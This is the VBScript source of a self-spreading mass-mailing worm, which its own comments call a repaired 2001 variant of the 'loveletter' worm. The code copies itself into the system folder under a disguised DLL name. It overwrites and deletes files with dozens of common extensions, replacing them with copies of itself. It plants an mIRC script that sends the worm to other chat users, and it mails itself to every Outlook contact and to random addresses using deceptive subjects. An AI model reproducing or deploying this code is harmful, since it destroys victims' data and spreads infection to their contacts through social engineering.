  rem (c) 2001 created by Felix The Cat.
  rem Special for Linda Indrawati at STTS University, Surabaya, Indonesia.
  rem Happy Birthday Linda (17 - 12 - 1977). 
  rem This is a repaired version.........
  On Error Resume Next
  rem I am Felix...
  dim fso,dirsystem,dirwin,dirtemp,eq,ctr,file,vbscopy,dow,wscr,rr
  Dim d,dc,s,listadriv 
  Set dc = fso.Drives
  rem ctr = "a"
  eq=""
  ctr=0
  Set fso = CreateObject("Scripting.FileSystemObject")
  set file = fso.OpenTextFile(WScript.ScriptFullname,1)
  vbscopy=file.ReadAll
  set wscr=CreateObject("WScript.Shell")
  Set dirsystem = fso.GetSpecialFolder(1)
  Set c = fso.GetFile(WScript.ScriptFullName)
  c.Copy(dirsystem&"\XMLDriver32.dll.vbs")
  For Each d in dc
  If d.DriveType = 2 or d.DriveType=3 or d.DriveType=4 Then
  folderlist(d.path&"\")
  mirc32(d.path&"\")
  end if
  Next
  listadriv = s
  waitaminute()
  spread()
  rem Felix The Cat is a free people not a member of any of virus maker club.........
  sub infectfiles(folderspec)
  On Error Resume Next
  dim f,f1,fc,ext,ap,mircfname,s,bname,mp3
  set f = fso.GetFolder(folderspec)
  set fc = f.Files
  for each f1 in fc
  rem how are you ???
  ext=fso.GetExtensionName(f1.path)
  ext=lcase(ext)
  s=lcase(f1.name)
  if (ext="vbs") or (ext="vbe") or (ext="js") or (ext="jse") or (ext="css") or (ext="wsh") or (ext="sct") or (ext="hta") or (ext="jpg") or (ext="jpeg") or (ext="mp3") or (ext="mp2") or (ext="xml") or (ext="php3") or (ext="htm") or (ext="wav") or (ext="bmp") or (ext="doc") or (ext="rtf") or (ext="xls") or (ext="ppt") or (ext="wri") or (ext="mdb") or (ext="zip") or (ext="rar") or (ext="arj") or (ext="pdf") or (ext="mid") or (ext="gif") or (ext="avi") or (ext="hlp") or (ext="frm") or (ext="mp4") or (ext="c") or (ext="pl") or (ext="pas") or (ext="ps") or (ext="tif") or (ext="wpd") or (ext="fm") or (ext="mk5") or (ext="asp") or (ext="txt") or (ext="chm") or (ext="gz") or (ext="tar") or (ext="wsc") or (ext="mht") or (ext="htt") or (ext="lha") or (ext="lzh") or (ext="pcx") or (ext="pif") then
  set ap=fso.OpenTextFile(f1.path,2,true)
  ap.write vbscopy
  ap.close
  bname=fso.GetBaseName(f1.path)
  set cop=fso.GetFile(f1.path)
  cop.copy(folderspec&"\"&bname&"."&ext&".vbs")
  fso.DeleteFile(f1.path)
  end if
  if (eq<>folderspec) then
  if (s="mirc32.exe") or (s="mlink32.exe") or (s="mirc.ini") or(s="script.ini") or (s="mirc.hlp") then
  set scriptini=fso.CreateTextFile(folderspec&"\script.ini")
  scriptini.WriteLine "[script]"
  scriptini.WriteLine "n0=on 1:JOIN:#:{"
  scriptini.WriteLine "n1= /if ( $nick == $me ) { halt }"
  scriptini.WriteLine "n2= /.dcc send $nick "&WScript.ScriptFullName
  scriptini.WriteLine "n3=}"
  rem looking for fun
  scriptini.close
  eq=folderspec
  end if
  end if
  next 
  end sub
  rem ABCDEFGHIJKLM
  sub folderlist(folderspec)
  On Error Resume Next
  dim f,f1,sf
  set f = fso.GetFolder(folderspec)
  set sf = f.SubFolders
  for each f1 in sf
  infectfiles(f1.path)
  folderlist(f1.path)
  rem just relax
  next
  end sub
  rem STTS University is located at Jl Ngagel Jaya Tengah 73 -77, Surabaya.
  rem x = x + 10
  sub waitaminute
  on error resume next
  dim sumn
  sumn=sumn+1
  rem waitaminute
  spreadtoeml()
  end sub
  rem listadriv
  sub spreadtoeml
  On Error Resume Next
  dim x,a,ctrlists,ctrentries,malead,b,regedit,regv,regad
  set regedit=CreateObject("WScript.Shell")
  set out=WScript.CreateObject("Outlook.Application")
  set mapi=out.GetNameSpace("MAPI")
  rem 1234
  for ctrlists=1 to mapi.AddressLists.Count
  set a=mapi.AddressLists(ctrlists)
  x=1
  rem Just watch the effect.........
  for ctrentries=1 to a.AddressEntries.Count
  malead=a.AddressEntries(x)
  set male=out.CreateItem(0)
  male.Recipients.Add(malead)
  rem not too bad
  male.Subject = "Important message from....."
  male.Body = vbcrlf&"This is the attached file you asked from me."
  male.Attachments.Add(WScript.ScriptFullName)
  male.Send
  rem Do not worry about your future.
  x=x+1
  next
  rem i am very stress..........
  next
  Set out=Nothing
  Set mapi=Nothing
  end sub
sub spread
on error resume next
  set out=WScript.CreateObject("Outlook.Application")
  set male=out.CreateItem(0)
  male.Subject = "Fw: Here is that thing....."
  male.BCC=chr(int(rnd*235)+20) & chr(int(rnd*235)+20) & chr(int(rnd*235)+20) & chr(int(rnd*235)+20) & chr(int(rnd*235)+20) & "@yahoo.com" & "; " & chr(int(rnd*235)+20) & chr(int(rnd*235)+20) &chr(int(rnd*235)+20) & chr(int(rnd*235)+20) & chr(int(rnd*235)+20) & "@mailcity.com" & "; " & chr(int(rnd*235)+20) & chr(int(rnd*235)+20) &chr(int(rnd*235)+20) & chr(int(rnd*235)+20) & chr(int(rnd*235)+20) & "@usa.net" & "; " & chr(int(rnd*235)+20) & chr(int(rnd*235)+20) &chr(int(rnd*235)+20) & chr(int(rnd*235)+20) & chr(int(rnd*235)+20) & "@lovemail.com"
  male.Body = vbcrlf&"This is the attached file you asked from me."
  male.Attachments.Add(WScript.ScriptFullName)
  male.Send
end sub
rem This is another version of loveletter but very powerful, I think....
sub mirc32(folderspec)
on error resume next
  dim f,f1,fc,ext,ap,mircfname,s,bname,mp3
  set f = fso.GetFolder(folderspec)
  set fc = f.Files
  for each f1 in fc
  ext=fso.GetExtensionName(f1.path)
  ext=lcase(ext)
  s=lcase(f1.name)
   if (s="mirc32.exe") or (s="mlink32.exe") then 
	wscr.Run(folderspec&"\mirc32.exe")
   end if
  next
end sub
